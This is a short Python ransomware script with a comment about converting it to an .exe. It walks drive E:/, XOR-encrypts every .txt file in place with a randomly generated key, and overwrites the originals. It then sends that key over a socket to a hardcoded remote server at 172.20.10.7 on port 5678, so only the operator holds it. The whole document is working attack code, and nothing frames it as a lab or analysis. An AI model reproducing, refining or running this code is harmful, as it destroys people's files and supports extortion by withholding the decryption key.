#To convert this .py file to .exe file
# !auto-py-to-exe

import random
import os
import socket

SERVER_IP = '172.20.10.7'
SERVER_PORT = 5678

#Random key generating
random_key = ''
for x in range(16):
    #0 to 127 is the range of all the available ascii characters
    x = random.randint(0, 127)
    c = chr(x)
    random_key = random_key + c

#Encrypting all the .txt files in the C directory
path = os.walk('E:/')
for root, directories, files in path:
    for file in files:
        if file.endswith(".txt"):
            #Opening the file
            f = open(os.path.join(root, file), 'r')
            #Reading the file
            plainText=f.read()
            #XOR-ing the file bytes
            if len(plainText) > 16:
                XORED_List = [chr(ord(a) ^ ord(b)) for a,b in zip(plainText,random_key*len(plainText))]
            else:
                XORED_List = [chr(ord(a) ^ ord(b)) for a,b in zip(plainText,random_key)]
            #Converting the list to string
            cipherText = ''.join([str(cell) for cell in XORED_List])
            #Re-open the file to be able to write on it and modify it
            f = open(os.path.join(root, file), 'w')
            #Removing the plain text from the file
            f.truncate(0)
            #Writing the cipher text to the file
            f.write(cipherText)
            #Closing the file after it has been encrypted
            f.close()

#Sending the generated random key to the server
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    data = s.recv(1024)
    print(data)
    s.send(random_key.encode())
input()
